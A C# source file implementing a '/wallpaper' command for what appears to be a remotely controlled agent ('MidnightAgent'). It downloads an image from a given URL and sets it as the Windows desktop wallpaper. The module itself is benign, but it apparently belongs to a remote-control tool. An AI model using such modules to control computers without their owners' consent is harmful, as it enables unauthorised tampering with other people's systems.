using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /wallpaper - Change desktop wallpaper
    /// </summary>
    public class WallpaperFeature : IFeature
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;

        public string Command => "wallpaper";
        public string Description => "Change desktop wallpaper";
        public string Usage => "/wallpaper <url>";

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0)
            {
                return FeatureResult.Fail("Usage: /wallpaper <url or path>");
            }

            string source = string.Join(" ", args);

            try
            {
                string imagePath;

                // Check if URL or local path
                if (source.StartsWith("http://") || source.StartsWith("https://"))
                {
                    // Download image
                    imagePath = Path.Combine(Path.GetTempPath(), "wallpaper.jpg");
                    using (var client = new WebClient())
                    {
                        await client.DownloadFileTaskAsync(new Uri(source), imagePath);
                    }
                }
                else
                {
                    imagePath = Environment.ExpandEnvironmentVariables(source);
                    if (!File.Exists(imagePath))
                    {
                        return FeatureResult.Fail($"File not found: {imagePath}");
                    }
                }

                // Set wallpaper
                int result = SystemParametersInfo(
                    SPI_SETDESKWALLPAPER,
                    0,
                    imagePath,
                    SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

                if (result != 0)
                {
                    return FeatureResult.Ok("✅ Wallpaper changed successfully!");
                }
                else
                {
                    return FeatureResult.Fail("Failed to change wallpaper");
                }
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Error: {ex.Message}");
            }
        }
    }
}
